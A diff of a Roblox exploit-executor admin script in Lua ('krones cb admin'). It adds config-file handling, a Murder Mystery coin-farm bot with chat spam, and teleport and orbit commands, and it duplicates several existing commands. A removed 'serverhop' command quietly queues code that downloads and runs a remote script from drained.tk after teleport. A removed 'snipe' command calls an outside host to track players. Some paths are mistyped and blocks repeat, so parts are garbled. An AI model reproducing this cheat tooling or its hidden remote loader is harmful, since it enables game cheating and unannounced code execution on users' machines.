@@ -1067,8 +1067,64 @@ local PluginSettings = {
     SafePlugins = false
 }
 
+local WriteConfig = function(Destroy)
+    local JSON = JSONEncode(Services.HttpService, Settings);
+    local PluginJSON = JSONEncode(Services.HttpService, PluginSettings);
+    if (isfolder("krones-clientbridge-admin") and Destroy) then
+        delfolder("krones-clientbridge-admin");
+        writefile("krones-clientbridge-admin/config.json", JSON);
+        writefile("krones/admin/pluings/plugin-conf.json", PluginJSON);
+    else
+        makefolder("krones-clientbridge-admin");
+        makefolder("krones-clientbridge-admin/plugins");
+        makefolder("krones-clientbridge-admin/chatlogs");
+        writefile("krones-clientbridge-admin/config.json", JSON);
+        writefile("krones-clientbridge-admin/plugins/plugin-conf.json", PluginJSON);
+    end
+end
 
+local GetConfig = function()
+    if (isfolder("krones-clientbridge-admin") and isfile("krones-clientbridge-admin/config.json")) then
+        return JSONDecode(Services.HttpService, readfile("krones-clientbridge-admin/config.json"));
+    else
+        WriteConfig();
+        return JSONDecode(Services.HttpService, readfile("krones-clientbridge-admin/config.json"));
+    end
+end
 
+local GetPluginConfig = function()
+    if (isfolder("krones-clientbridge-admin") and isfolder("krones-clientbridge-admin/plugins") and isfile("krones-clientbridge-admin/plugins/plugin-conf.json")) then
+        local JSON = JSONDecode(Services.HttpService, readfile("krones-clientbridge-admin/plugins/plugin-conf.json"));
+        return JSON
+    else
+        WriteConfig();
+        return JSONDecode(Services.HttpService, readfile("krones-clientbridge-admin/plugins/plugin-conf.json"));
+    end
+end
+
+local SetPluginConfig = function(conf)
+    if (isfolder("krones-clientbridge-admin") and isfolder("krones-clientbridge-admin/plugins") and isfile("krones-clientbridge-admin/plugins/plugin-conf.json")) then
+        WriteConfig();
+    end
+    local NewConfig = GetPluginConfig();
+    for i, v in next, conf do
+        NewConfig[i] = v
+    end
+    writefile("krones-clientbridge-admin/plugins/plugin-conf.json", JSONEncode(Services.HttpService, NewConfig));
+end
+
+local SetConfig = function(conf)
+    if (not isfolder("krones-clientbridge-admin") and isfile("krones-clientbridge-admin/config.json")) then
+        WriteConfig();
+    end
+    local NewConfig = GetConfig();
+    for i, v in next, conf do
+        NewConfig[i] = v
+    end
+    writefile("krones-clientbridge-admin/config.json", JSONEncode(Services.HttpService, NewConfig));
+end
+
+local CurrentConfig = GetConfig();
 local Prefix = isfolder and CurrentConfig.Prefix or "!"
 local Macros = CurrentConfig.Macros or {}
 local AdminUsers = AdminUsers or {}
@@ -2600,11 +2656,6 @@ do
     end));
 end
 
-AddCommand("commandcount", {"cc"}, "shows you how many commands there is in krones cb admin", {}, function(Caller)
-    Utils.Notify(Caller, "Amount of Commands", format("There are currently %s commands.", #filter(CommandsTable, function(i,v)
-        return indexOf(CommandsTable, v) == i
-    end)))
-end)
 
 AddCommand("hipheight", {"hh"}, "changes your hipheight to the second argument", {}, function(Caller, Args, CEnv)
     local Humanoid = GetHumanoid();
@@ -3133,7 +3184,6 @@ AddCommand("advertise", {}, "advertises the script", {}, function()
 end)
 
 AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, function(Caller)
-    if (Caller == LocalPlayer) then
         local TeleportService = Services.TeleportService
         if (#GetPlayers(Players) == 1) then
             LocalPlayer:Kick();
@@ -3141,60 +3191,8 @@ AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, functio
         else
             TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, game.JobId)
         end
-        return "Rejoining..."
-    end
+    return "Rejoining..."
 end)
-
-AddCommand("serverhop", {"sh"}, "switches servers (optional: min, max (default: max))", {{"min", "max"}}, function(Caller, Args)
-    if (Caller == LocalPlayer) then
-        Utils.Notify(Caller or LocalPlayer, "Command", "Looking for servers...");
-        local order = ""
-        local Option, Server = lower(Args[1] or "max");
-        if Option == "min" then
-            order = "Asc"
-        elseif Option == "max" then
-            order = "Desc"
-        end;
-
-        local Servers = {};
-        local url = format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100", game.PlaceId, order);
-        local starting = tick();
-        repeat
-            local good, result = pcall(function()
-                return game:HttpGet(url);
-            end);
-            if (not good) then
-                wait(2);
-                continue;
-            end
-            local decoded = Services.HttpService:JSONDecode(result);
-            if (#decoded.data ~= 0) then
-                Servers = decoded.data
-                for i, v in pairs(Servers) do
-                    if (v.maxPlayers and v.playing and v.maxPlayers > v.playing and v.id ~= game.JobId) then
-                        Server = v
-                        break;
-                    end
-                end
-                if (Server) then
-                    break;
-                end
-            end
-            url = format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100&cursor=%s", game.PlaceId, order, decoded.nextPageCursor);
-        until tick() - starting >= 600;
-        if (not Server or #Servers == 0) then
-            return "no servers found";
-        end
-
-        local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
-        if (queue_on_teleport and not Args[2]) then
-            queue_on_teleport("loadstring(game.HttpGet(game, \"https://drained.tk/end.lua\"))()");
-        end;
-
-        Services.TeleportService:TeleportToPlaceInstance(game.PlaceId, Server.id);    
-        return format("joining server (%d/%d players)", Server.playing, Server.maxPlayers);
-    end
-end);
 
 AddCommand("whitelist", {"wl"}, "whitelists a user so they can use commands", {"1"}, function(Caller, Args)
     local Target = GetPlayer(Args[1]);
@@ -3208,113 +3206,7 @@ AddCommand("whitelisted", {"whitelistedusers"}, "shows all the users whitelisted
     return next(AdminUsers) and concat(map(AdminUsers, function(i,v) return v.Name end), ", ") or "no users whitelisted"
 end)
 
-
-AddCommand("noexception", {}, "removes user from exceptions list", {"1"}, function(Caller, Args)
-    for i2, v2 in next, Exceptions do
-        if (v2.Name == Args[1]) then
-            v2 = nil
-        end
-        Utils.Notify(Caller, "Command", Args[1] .. " is removed from the exceptions list");
-    end
-end)
-
-AddCommand("clearexceptions", {}, "removes users from exceptions list", {}, function(Caller, Args)
-    Exceptions = {}
-    return "exceptions list cleared"
-end)
-local CommandsLoaded = false
-AddCommand("commands", {"cmds"}, "shows you all the commands listed in krones cb admin", {}, function()
-    if (not CommandsLoaded) then
-        local CommandsList = Commands.Frame.List
-        Utils.SmoothScroll(CommandsList, .14);
-        for _, v in next, CommandsTable do
-            if (not FindFirstChild(CommandsList, v.Name)) then
-                local Clone = Clone(Command)
-                Utils.Hover(Clone, "BackgroundColor3");
-                Utils.ToolTip(Clone, v.Name .. "\n" .. v.Description);
-                Clone.CommandText.Text = v.Name .. (#v.Aliases > 0 and " (" ..concat(v.Aliases, ", ") .. ")" or "");
-                Clone.Name = v.Name
-                Clone.Visible = true
-                Clone.Parent = CommandsList
-            end
-        end
-        Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y);
-        CommandsTransparencyClone = Clone(Commands);
-        Utils.SetAllTrans(Commands)
-        CommandsLoaded = true
-    end
-    Commands.Visible = true
-    Utils.TweenAllTransToObject(Commands, .25, CommandsTransparencyClone);
-    return "Commands Loaded"
-end)
-
-AddCommand("killscript", {}, "kills the script", {}, function(Caller)
-    if (Caller == LocalPlayer) then
-        deepsearch(Connections, function(i,v)
-            if (type(v) == 'userdata' and v.Disconnect) then
-                Disconnect(v);
-            elseif (type(v) == 'boolean') then
-                v = false
-            end
-        end);
-        for i, v in next, Hooks.SpoofedProperties do
-            for i2, v2 in next, v do
-                i[v2.Property] = v2.SpoofedProperty[v2.Property]
-            end
-        end
-        for i, v in next, Hooks do
-            if (type(v) == 'boolean') then
-                v = false
-            end
-            if (type(v) == 'function') then
-                
-            end
-        end
-        Destroy(UI);
-        getgenv().F_A = nil
-        setreadonly(mt, false);
-        mt = OldMetaMethods
-        setreadonly(mt, true);
-        for i, v in next, getfenv() do
-            getfenv()[i] = nil
-        end
-    end
-end)
-
-AddCommand("setprefix", {}, "changes your prefix", {"1"}, function(Caller, Args)
-    local PrefixToSet = Args[1]
-    if (match(PrefixToSet, "%A")) then
-        Prefix = PrefixToSet
-        Utils.Notify(Caller, "Command", format("your new prefix is now '%s'", PrefixToSet));
-        return "use command saveprefix to save your prefix"
-    else
-        return "prefix must be a symbol"
-    end
-end)
-
-AddCommand("setcommandbarprefix", {"setcprefix"}, "sets your command bar prefix to whatever you input", {}, function()
-    ChooseNewPrefix = true
-    local CloseNotif = Utils.Notify(LocalPlayer, "New Prefix", "Input the new prefix you would like to have", 7);
-end)
-
-AddCommand("saveprefix", {}, "saves your prefix", {}, function(Caller, Args)
-    if (GetConfig().Prefix == Prefix and Enum.KeyCode[GetConfig().CommandBarPrefix] == CommandBarPrefix) then
-        return "nothing to save, prefix is the same"
-    else
-        SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
-        return "saved prefix"
-    end
-end)
-
-AddCommand("clear", {"clearcli", "cls"}, "clears the commandline (if open)", {}, function()
-    if (_L.CLI) then
-        rconsoleclear();
-        rconsolename("Admin Command Line");
-        rconsoleprint("\nCommand Line:\n");
-        return "cleared console"
-    end
-    return "cli is not open"
-end)
+    
 
 AddCommand("orbit", {}, "orbits a yourself around another player", {3, "1"}, function(Caller, Args, CEnv)
     local Target = GetPlayer(Args[1])[1];
@@ -3339,30 +3231,6 @@ AddCommand("unorbit", {"noorbit"}, "unorbits yourself from the other player", {}
     return "orbit stopped"
 end)
 
--- AddCommand("bypass", {"clientbypass"}, "client sided bypass", {3}, function()
---     AddConnection(CConnect(LocalPlayer.CharacterAdded, function()
---         WaitForChild(GetCharacter(), "Humanoid");
---         wait(.4);
---         SpoofInstance(GetHumanoid());
---         SpoofInstance(GetRoot(), isR6() and GetCharacter().Torso or GetCharacter().UpperTorso);
---         ProtectInstance(GetRoot());
---         ProtectInstance(GetHumanoid());
---     end));
---     local Char = GetCharacter();
---     Char.BreakJoints(Char);
---     CommandsTable["goto"].Function = CommandsTable["tweento"].Function
---     CommandsTable["to"].Function = CommandsTable["tweento"].Function
---     return "clientsided bypass enabled"
--- end)
-	
-AddCommand("copyid", {"copyuserid", "copyuid"}, "copies someones userid to your clipboard", {"1"}, function(Caller, Args)
-    local Target = GetPlayer(Args[1])
-    if (setclipboard and Target[1]) then
-        setclipboard(Target.UserId);
-        return format("copied %s' userid", Target.Name);
-    end
-    return "exploit doesn't have copy clipboard support"
-end)
 
 AddCommand("plastic", {"fpsboost"}, "changes everything to a plastic material", {}, function(Caller, Args, CEnv)
     local time = tick();
@@ -3390,113 +3258,6 @@ AddCommand("antiafk", {"antiidle"}, "prevents kicks from when you're afk", {}, f
         end
     end
     return "antiafk " .. (IsEnabled and " disabled" or "enabled");
-end)
-
-
-AddCommand("equiptools", {}, "equips all of your tools", {1}, function()
-    UnequipTools(GetHumanoid());
-    local Char = GetCharacter();
-    local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
-        return IsA(Child, "Tool");
-    end);
-    for i, v in next, Tools do
-        v.Parent = Char
-    end
-    return format("equipped %d tools", #Tools);
-end)
-
-AddCommand("activatetools", {}, "equips and activates all of your tools", {1}, function()
-    local VirtualInputManager = Services.VirtualInputManager
-    local SendMouseButtonEvent = VirtualInputManager.SendMouseButtonEvent
-    UnequipTools(GetHumanoid());
-    local Char = GetCharacter();
-    local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
-        return IsA(Child, "Tool");
-    end);
-    for i, v in next, Tools do
-        v.Parent = Char
-    end
-    wait();
-    for i, v in next, Tools do
-        v.Activate(v);
-    end
-    SendMouseButtonEvent(VirtualInputManager, 0, 0, 0, true, nil, #Tools);
-    -- return format("equipped and activated %d tools", #Tools);
-end)
-AddCommand("deletetool", {"deltool"}, "deletes your equipped tool", {1}, function()
-    local Tool = FindFirstChildWhichIsA(GetCharacter(), "Tool");
-    if (Tool) then
-        Destroy(Tool);
-        return "deleted tool"
-    else
-        return "no tool equipped"
-    end
-end)
-
-AddCommand("deletetools", {"deltools"}, "delets all of your tools in your inventory", {1}, function()
-    UnequipTools(GetHumanoid());
-    local Tools = GetChildren(LocalPlayer.Backpack);
-    for i = 1, #Tools do
-        Destroy(Tools[i]);
-    end
-    return "deleted all tools"
-end)
-
-AddCommand("snipe", {"streamsnipe"}, "stream snipes a user", {"2"}, function(Caller, Args)
-    local PlaceId = tonumber(Args[1]);
-    local UserId = tonumber(Args[2]);
-    if (not PlaceId) then
-        return "placeid expected"
-    end
-    if (not UserId) then
-        return "userid expected"
-    end
-    local Ret = game.HttpGet(game, format("https://fate123.000webhostapp.com/sniper.php?uid=%s&placeId=%s", UserId, PlaceId));
-    local Success, JSON = pcall(JSONDecode, Services.HttpService, Ret);
-    if (not Success) then
-        return "error occured"
-    end
-    if (JSON.error) then
-        return "error: " .. JSON.error
-    end
-    local GameInfo = JSON.game
-    local UserInfo = JSON.userinfo
-    local TeleportService = Services.TeleportService
-    TeleportService.TeleportToPlaceInstance(TeleportService, GameInfo.gameid, GameInfo.guid);
-    return format("joining %s on game %s (%d/%d)", UserInfo.username, GameInfo.gamename, GameInfo.playing, GameInfo.capacity);
-end)
-
-AddCommand("loop", {"loopcommand"}, "loops a command", {"1"}, function(Caller, Args, CEnv)
-    local Command = Args[1]
-    local LoadedCommand = LoadCommand(Command);
-    if (not LoadedCommand) then
-        return format("command %s not found", Command);
-    end
-    Args = shift(Args);
-    CEnv.Looping = true
-    CEnv.LoopedCommands = CEnv.LoopedCommands or {}
-    CEnv.LoopedCommands[Command] = true
-    CThread(function()
-        while (CEnv.Looping and CEnv.LoopedCommands[Command]) do
-            ExecuteCommand(Command, Args, Caller);
-            wait(tonumber(Args[#Args]) or 1);
-        end
-    end)();
-    return format("now looping the %s command", Command);
-end)
-
-AddCommand("unloop", {"unloopcommand"}, "unloops a command", {}, function(Caller, Args)
-    local Looped = LoadCommand("loop").CmdEnv
-    if (Args[1]) then
-        if (Looped.LoopedCommands[Args[1]]) then
-            Looped.LoopedCommands[Args[1]] = nil
-            return format("unlooped command %s", Args[1]);
-        end
-        return "command isn't looped"
-    else
-        Looped.Looping = false
-        return "unlooped all commands looped"
-    end
 end)
 
 AddCommand("disablesit", {"neversit", "nosit"}, "disables you from being sat", {}, function(Caller, Args, CEnv)
@@ -3563,6 +3324,371 @@ AddCommand("pathfind", {"follow2"}, "finds a user with pathfinding", {"1",3}, fu
         end
     end
 end)
+
+
+
+AddCommand("console", {"errors", "warns", "outputs"}, "shows the outputs krones cb admin has made", {}, function()
+    local MessageClone = Clone(Console.Frame.List);
+    
+    Utils.ClearAllObjects(Console.Frame.List)
+    Console.Visible = true
+
+    local Tween = Utils.TweenAllTransToObject(Console, .25, ConsoleTransparencyClone)
+
+    Destroy(Console.Frame.List)
+    MessageClone.Parent = Console.Frame
+
+    for i, v in next, GetChildren(Console.Frame.List) do
+        if (not IsA(v, "UIListLayout")) then
+            Utils.Tween(v, "Sine", "Out", .25, {
+                TextTransparency = 0
+            })
+        end
+    end
+
+    local ConsoleListLayout = Console.Frame.List.UIListLayout
+
+    CConnect(GetPropertyChangedSignal(ConsoleListLayout, "AbsoluteContentSize"), function()
+        local CanvasPosition = Console.Frame.List.CanvasPosition
+        local CanvasSize = Console.Frame.List.CanvasSize
+        local AbsoluteSize = Console.Frame.List.AbsoluteSize
+
+        if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
+           wait();
+           Console.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000);
+        end
+    end)
+
+    Utils.Tween(Console.Frame.List, "Sine", "Out", .25, {
+        ScrollBarImageTransparency = 0
+    })
+end)
+
+
+AddCommand("reset", {"re", "respawn"}, "respawns your character", {3}, function()
+    local OldPos = GetRoot().CFrame
+    local Char = GetCharacter();
+    Char.BreakJoints(Char);
+    CWait(LocalPlayer.CharacterAdded);
+    WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
+    return "respawned"
+end)
+
+
+local coinfarm = false
+AddCommand("coinfarm", {"cf"}, "farms for coins in murder mystery", {3}, function()
+local function notify(text)
+game:GetService("StarterGui"):SetCore("SendNotification",{
+Title = "Vain",
+Text = text, 
+Duration = "5"
+})
+end
+
+local success, eth = pcall(function()
+    return game:GetObjects("rbxassetid://1957152855")[1]
+end)
+
+if success then
+eth.Parent = workspace
+eth:SetPrimaryPartCFrame(CFrame.new(Vector3.new(99999, 99999, 99999)))
+else
+notify(eth)
+end
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Started Collecting Coins", "normalchat")
+local function collectCoin(coin)
+    if not coin or not coin.Parent then
+        return
+    end
+
+    local Character = game.Players.LocalPlayer.Character
+    local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+
+    while coinfarm do
+        if not coin.Parent then
+            break
+        end
+
+        if not Character:FindFirstChild("Humanoid") or Character.Humanoid.Health <= 0 then
+        repeat wait() -- Wait until the character is respawned
+            Character = game.Players.LocalPlayer.Character
+        until Character and Character:FindFirstChild("Humanoid") and Character.Humanoid.Health > 0
+        end
+
+        local coinCFrame = coin.CFrame
+        local distance = (coinCFrame.Position - HumanoidRootPart.Position).Magnitude
+
+        if distance > 5 then
+            game.Players.LocalPlayer.Character:MoveTo(coinCFrame.Position)
+        else
+            break
+        end
+
+        wait(1)
+    end
+
+    if coinfarm then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = eth:FindFirstChild("Spawn").CFrame
+        wait(1)  -- Adjust this wait time as needed
+    end
+end
+
+coinfarm = true
+
+while coinfarm do
+    wait() -- Added wait here to prevent excessive loops
+
+    local Character = game.Players.LocalPlayer.Character
+
+    if Character and Character:FindFirstChild("Humanoid") and Character.Humanoid.Health > 0 then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = eth:FindFirstChild("Spawn").CFrame
+
+        local CoinContainer = game.Workspace:FindFirstChild("CoinContainer", true)
+
+        if not CoinContainer then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Waiting for coins | Coins not found.", "normalchat")
+            repeat wait() 
+                CoinContainer = game.Workspace:FindFirstChild("CoinContainer", true)
+            until CoinContainer
+        end
+
+        local coins = CoinContainer:GetChildren()
+        local coinToCollect = nil
+
+        for i, coin in pairs(coins) do
+            if coin.Name == "Coin_Server" then
+                coinToCollect = coin
+                break
+            end
+        end
+
+        if coinToCollect then
+            collectCoin(coinToCollect)
+            wait(2)  -- Adjust this wait time as needed
+        else
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("No more coins to collect", "normalchat")
+            wait(1)
+        end
+    end
+end
+end)
+
+AddCommand("uncoinfarm", {"uncf"}, "farms for coins in murder mystery", {3}, function()
+coinfarm = false
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ended CoinFarm", "normalchat")
+return "ended coinfarm"
+end)
+
+
+AddCommand("spin", {}, "spins your character (optional: speed)", {}, function(Caller, Args, CEnv)
+    local Speed = Args[1] or 5
+    if (not CEnv[1]) then
+        local Spin = InstanceNew("BodyAngularVelocity");
+        ProtectInstance(Spin);
+        Spin.Parent = GetRoot();
+        Spin.MaxTorque = Vector3New(0, math.huge, 0);
+        Spin.AngularVelocity = Vector3New(0, Speed, 0);
+        CEnv[#CEnv + 1] = Spin
+    else
+        CEnv[1].AngularVelocity = Vector3New(0, Speed, 0);
+    end
+    return "started spinning"
+end)
+
+AddCommand("unspin", {}, "unspins your character", {}, function(Caller, Args)
+    local Spinning = LoadCommand("spin").CmdEnv
+    for i, v in next, Spinning do
+        Destroy(v);
+    end
+    LoadCommand("spin").CmdEnv = {}
+    return "stopped spinning"
+end)
+
+AddCommand("goto", {"to"}, "teleports yourself to the other character", {3, "1"}, function(Caller, Args)
+    local Target = GetPlayer(Args[1]);
+    local Delay = tonumber(Args[2]);
+    for i, v in next, Target do
+        if (Delay) then
+            wait(Delay);
+        end
+        if (Caller ~= LocalPlayer) then
+            ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
+        else
+            GetRoot().CFrame = GetRoot(v).CFrame * CFrameNew(-5, 0, 0);
+        end
+    end
+end)
+
+AddCommand("loopgoto", {"loopto"}, "loop teleports yourself to the other character", {3, "1"}, function(Caller, Args, CEnv)
+    local Target = GetPlayer(Args[1])[1]
+    local Connection = CConnect(Heartbeat, function()
+        GetRoot().CFrame = GetRoot(Target).CFrame * CFrameNew(0, 0, 2);
+    end)
+
+    CEnv[Target.Name] = Connection
+    AddPlayerConnection(LocalPlayer, Connection);
+    AddConnection(Connection);
+    return "now looping to " .. Target.name
+end)
+
+AddCommand("unloopgoto", {"unloopto"}, "removes loop teleportation to the other character", {}, function(Caller)
+    local Looping = LoadCommand("loopgoto").CmdEnv;
+    if (not next(Looping)) then
+        return "you aren't loop teleporting to anyone"
+    end
+    DisableAllCmdConnections("loopgoto");
+    return "loopgoto disabled"
+end)
+
+AddCommand("tweento", {"tweengoto"}, "tweens yourself to the other person", {3, "1"}, function(Caller, Args)
+    local Target = GetPlayer(Args[1]);
+    local TweenService = Services.TweenService
+    local Create = TweenService.Create
+    for i, v in next, Target do
+        local Tween = Create(TweenService, GetRoot(), TweenInfo.new(2), {CFrame = GetRoot(v).CFrame})
+        Tween.Play(Tween);
+    end
+end)
+
+
+
+
+AddCommand("advertise", {}, "advertises the script", {}, function()
+    local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+    ChatRemote.FireServer(ChatRemote, "I am using the best admin for client bridging. || faults cb admin || , join the server (deleted)", "All");
+end)
+
+AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, function(Caller)
+        local TeleportService = Services.TeleportService
+        if (#GetPlayers(Players) == 1) then
+            LocalPlayer:Kick();
+            TeleportService.Teleport(TeleportService, game.PlaceId);
+        else
+            TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, game.JobId)
+        end
+        return "Rejoining..."
+end)
+
+
+
+AddCommand("plastic", {"fpsboost"}, "changes everything to a plastic material", {}, function(Caller, Args, CEnv)
+    local time = tick();
+    local Plasticc = 0
+    for i, v in next, GetDescendants(Workspace) do
+        if (IsA(v, "Part") and v.Material ~= Enum.Material.Plastic) then
+            CEnv[v] = v.Material
+            v.Material = Enum.Material.Plastic
+            Plasticc = Plasticc + 1
+        end
+    end
+    return format("%d items made plastic in %.3f (s)", Plasticc, (tick()) - time);
+end)
+
+
+AddCommand("antiafk", {"antiidle"}, "prevents kicks from when you're afk", {}, function(Caller, Args, CEnv)
+    local IsEnabled = CEnv[1]
+    for i, v in next, getconnections(LocalPlayer.Idled, true) do
+        if (IsEnabled) then
+            v.Enable(v);
+            CEnv[1] = nil
+        else
+            v.Disable(v);
+            CEnv[1] = true
+        end
+    end
+    return "antiafk " .. (IsEnabled and " disabled" or "enabled");
+end)
+
+
+AddCommand("orbit", {}, "orbits a yourself around another player", {3, "1"}, function(Caller, Args, CEnv)
+    local Target = GetPlayer(Args[1])[1];
+    if (Target == LocalPlayer) then
+        return "You cannot orbit yourself."
+    end
+    local Radius = tonumber(Args[3]) or 7
+    local Speed = tonumber(Args[2]) or 1
+    local random = random(tick() / 2, tick());
+    local Root, TRoot = GetRoot(), GetRoot(Target);
+    AddConnection(CConnect(Heartbeat, function()
+        Root.CFrame = CFrameNew(TRoot.Position + Vector3New(sin(tick() * Speed) * Radius, 0, cos(tick() * Speed) * Radius), TRoot.Position);
+    end), CEnv);
+    return "now orbiting around " .. Target.Name
+end)
+
+AddCommand("unorbit", {"noorbit"}, "unorbits yourself from the other player", {}, function()
+    if (not next(LoadCommand("orbit").CmdEnv)) then
+        return "you are not orbiting around someone"
+    end
+    DisableAllCmdConnections("orbit");
+    return "orbit stopped"
+end)
+
+AddCommand("disablesit", {"neversit", "nosit"}, "disables you from being sat", {}, function(Caller, Args, CEnv)
+    local Humanoid = GetHumanoid();
+    AddConnection(CConnect(GetPropertyChangedSignal(Humanoid, "Sit"), function()
+        CWait(Heartbeat);
+        Humanoid.Sit = false
+    end), CEnv);
+    AddConnection(CConnect(LocalPlayer.CharacterAdded, function(Char)
+        Humanoid = WaitForChild(Char, "Humanoid");
+        AddConnection(CConnect(GetPropertyChangedSignal(Humanoid, "Sit"), function()
+            CWait(RunService.Heartbeat);
+            Humanoid.Sit = false
+        end), CEnv);
+    end), CEnv)
+    return "disabled sit"
+end)
+
+AddCommand("enablesit", {"undisablesit"}, "enables disablesit", {}, function()
+    DisableAllCmdConnections("disablesit");
+    return "enabled sit"
+end)
+
+
+AddCommand("pathfind", {"follow2"}, "finds a user with pathfinding", {"1",3}, function(Caller, Args)
+    local PathfindingService = Services.PathfindingService
+    local CreatePath = PathfindingService.CreatePath
+    local Target = GetPlayer(Args[1]);
+    local LRoot = GetRoot();
+    local LHumanoid = GetHumanoid();
+    local PSSuccess = Enum.PathStatus.Success
+    local Delay = tonumber(Args[2]);
+    for i, v in next, Target do
+        local TRoot = GetRoot(v);
+        if (not TRoot) then
+            continue;
+        end
+        local Path = CreatePath(PathfindingService);
+        Path.ComputeAsync(Path, LRoot.Position, TRoot.Position);
+        if (LHumanoid.Sit) then
+            ChangeState(LHumanoid, 3);
+        end
+        LHumanoid.WalkSpeed = 16
+        LHumanoid.MoveTo(LHumanoid, TRoot.Position);
+        wait(2);
+        local WayPoints = Path.GetWaypoints(Path);
+        for i = 1, #WayPoints do
+            local WayPoint = WayPoints[i]
+            if (Path.Status == PSSuccess) then
+                LHumanoid.WalkToPoint = WayPoint.Position
+                if (WayPoint.Action == Enum.PathWaypointAction.Jump) then
+                    LHumanoid.WalkSpeed = 0
+                    wait();
+                    LHumanoid.WalkSpeed = 16
+                    ChangeState(LHumanoid, 3);
+                end
+                CWait(LHumanoid.MoveToFinished);
+            else
+                repeat Path.ComputeAsync(Path, LRoot.Position, TRoot.Position) until Path.Status == PSSuccess;
+            end
+        end
+        if (Delay) then
+            wait(Delay);
+        end
+    end
+end)
+
 
 
 task.spawn(function()
@@ -3645,6 +3771,7 @@ task.spawn(function()
     end);
 
 end);
+
 --IMPORT [uimore]
 Notification.Visible = false
 Utils.SetAllTrans(CommandBar);
@@ -4192,9 +4319,1171 @@ do
     end
 end
 
+local ConfigUILib = {}
+do
+    local GuiObjects = ConfigElements
+    local PageCount = 0
+    local SelectedPage
+    local UserInputService = Services.UserInputService
+
+    local Colors = {
+        ToggleEnabled = Color3.fromRGB(5, 5, 6);
+        Background = Color3.fromRGB(32, 33, 36);
+        ToggleDisabled = Color3.fromRGB(27, 28, 31);
+    }
+
+    local ColorElements = ConfigElements.Elements.ColorElements
+    local Overlay = ColorElements.Overlay
+    local OverlayMain = Overlay.Main
+    local ColorPicker = OverlayMain.ColorPicker
+    local Settings = OverlayMain.Settings
+    local ClosePicker = OverlayMain.Close
+    local ColorCanvas = ColorPicker.ColorCanvas
+    local ColorSlider = ColorPicker.ColorSlider
+    local ColorGradient = ColorCanvas.ColorGradient
+    local DarkGradient = ColorGradient.DarkGradient
+    local CanvasBar = ColorGradient.Bar
+    local RainbowGradient = ColorSlider.RainbowGradient
+    local SliderBar = RainbowGradient.Bar
+    local CanvasHitbox = ColorCanvas.Hitbox
+    local SliderHitbox = ColorSlider.Hitbox
+    local ColorPreview = Settings.ColorPreview
+    local ColorOptions = Settings.Options
+    local RedTextBox = ColorOptions.Red.TextBox
+    local BlueTextBox = ColorOptions.Blue.TextBox
+    local GreenTextBox = ColorOptions.Green.TextBox
+    local RainbowToggle = ColorOptions.Rainbow
+
+    local function UpdateClone()
+        ConfigUIClone = Clone(ConfigUI);
+    end
+
+    function ConfigUILib.NewPage(Title)
+        local Page = Clone(GuiObjects.Page.Container);
+        local TextButton = Clone(GuiObjects.Page.TextButton);
+
+        Page.Visible = true
+        TextButton.Visible = true
+
+        Utils.Click(TextButton, "BackgroundColor3")
+            
+        if PageCount == 0 then
+            SelectedPage = Page
+        end
+
+        AddConnection(CConnect(TextButton.MouseButton1Click, function()
+            if SelectedPage.Name ~= TextButton.Name then          
+                SelectedPage = Page
+                ConfigUI.Container.UIPageLayout:JumpTo(SelectedPage)
+            end
+        end))
+        
+        Page.Name = Title
+        TextButton.Name = Title
+        TextButton.Text = Title
+        
+        Page.Parent = ConfigUI.Container
+        TextButton.Parent = ConfigUI.Selection
+        
+        PageCount = PageCount + 1
+
+
+        UpdateClone()
+
+        local function GetKeyName(KeyCode)
+            local _, Stringed = pcall(UserInputService.GetStringForKeyCode, UserInputService, KeyCode);
+            local IsEnum = Stringed == ""
+            return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
+        end
+
+        local PageLibrary = {}
+
+        function PageLibrary.CreateMacroSection(MacrosToAdd, Callback)
+            local Macro = Clone(GuiObjects.Elements.Macro);
+            local MacroPage = Macro.MacroPage
+            local Selection = Page.Selection
+            
+            Selection.ClearAllChildren(Selection);
+            for i,v in next, GetChildren(MacroPage) do
+                v.Parent = Selection
+            end
+            Selection.Container.Visible = true
+            local CommandsList = Selection.Container.Commands.Frame.List
+            local CurrentMacros = Selection.Container.CurrentMacros
+            local AddMacro = Selection.AddMacro
+            local BindA, CommandA, ArgsA = AddMacro.Bind, AddMacro.Command, AddMacro["z Args"]
+            local Add = AddMacro.AddMacro
+            local Keybind = {};
+            local Enabled = false
+            local Connection
+            
+            local OnClick = function()
+                Enabled = not Enabled
+                if Enabled then
+                    BindA.Text = "..."
+                    local OldShiftLock = LocalPlayer.DevEnableMouseLock
+                    LocalPlayer.DevEnableMouseLock = false
+                    Keybind = {}
+                    Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
+                        if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
+                            local Input2, Proccessed2;
+                            CThread(function()
+                                Input2, Proccessed2 = CWait(UserInputService.InputBegan);
+                            end)()
